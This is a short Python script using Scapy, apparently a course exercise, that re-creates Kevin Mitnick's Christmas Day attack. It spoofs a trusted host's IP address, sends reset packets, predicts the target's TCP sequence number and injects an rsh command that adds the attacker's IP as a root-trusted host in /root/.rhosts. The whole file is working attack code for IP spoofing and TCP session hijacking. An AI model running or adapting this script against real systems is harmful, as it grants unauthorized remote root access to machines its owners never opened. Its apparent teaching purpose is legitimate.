from scapy.all import *
import sys
import time
import random
"""
This is part of Mitnick's Christmas Day attack
- Goal: execute a bash command on the target machine that adds tha attacker IP address to the list of trusted hosts
- do this by pretending to be a trusted IP address
- The targeted server is vulnerable because it use preditable sequence number
"""
SRC_PORT = 601
DST_PORT = 514
# python3 cp2.2.mitnick.py eth0 10.4.61.25 72.36.89.200
if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]
    my_ip = get_if_addr(sys.argv[1])
    conf.verb = 0
    command = "echo '" + my_ip + " root' >> /root/.rhosts"
    payload = 'root\0root\0' + command + '\0'
    payload = b'0\0' + str.encode(payload)

    send(IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=SRC_PORT,  dport=DST_PORT, flags='R'))
    send(IP(src=my_ip, dst=target_ip)/TCP(sport=SRC_PORT,  dport=DST_PORT, flags='R'))
    
    #TODO: figure out SYN sequence number pattern
    p = IP(dst=target_ip) / TCP(sport=SRC_PORT, dport=DST_PORT, flags='S', seq=0)
    resp = sr1(p)
    ack = resp[TCP].seq + 128000
    time.sleep(1)

    #TODO: TCP hijacking with predicted sequence number
    seq = random.randint(0, 0xffffff)

    # SYN
    p = IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=SRC_PORT, dport=DST_PORT, flags='S', seq=seq)
    send(p)
    seq += 1
    time.sleep(1)

    # ACK
    p = IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=SRC_PORT, dport=DST_PORT, flags='A', seq=seq, ack=ack)/ Raw(load=payload)
    send(p)
    send( IP(src=trusted_host_ip, dst=target_ip)/TCP(sport=SRC_PORT,  dport=DST_PORT, flags='R'))

    